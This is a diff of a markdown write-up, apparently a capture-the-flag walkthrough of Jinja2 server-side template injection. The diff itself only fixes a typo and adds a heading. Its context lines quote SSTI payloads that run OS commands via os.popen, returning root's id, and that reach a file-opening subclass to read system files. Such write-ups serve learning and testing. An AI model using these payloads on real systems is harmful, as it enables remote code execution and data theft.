@@ -95,7 +95,7 @@ Sending: __`{{request.application.__globals__.__builtins__.__import__('os').pope
 
 - Returns: uid=0(root) gid=0(root) groups=0(root) 
 
-From the developing an exploiut in https://www.onsecurity.io/blog/server-side-template-injection-with-jinja2/#payload-development-from-0...
+From the __developing an exploit__ section in https://www.onsecurity.io/blog/server-side-template-injection-with-jinja2/#payload-development-from-0...
 ![image](https://github.com/user-attachments/assets/b23ae18f-6e68-48c6-8b1a-6632659c9392)
 
 Sending: __`{{get_flashed_messages}}`__
@@ -133,7 +133,7 @@ Sending: __`{{get_flashed_messages.__class__.__mro__[1].__subclasses__()[40]('/e
 
 - Returns: __Internal server error__
 
-
+<h2> Applying this to the our target </h2>
 After a bit of further self experimentation, I took the 'app' name of the application and started parsing some similar dunder methods to it to see what was getting returned, maybe we can find our winfunction this way.
 
 Sending: __`{{app.__class__}}`__
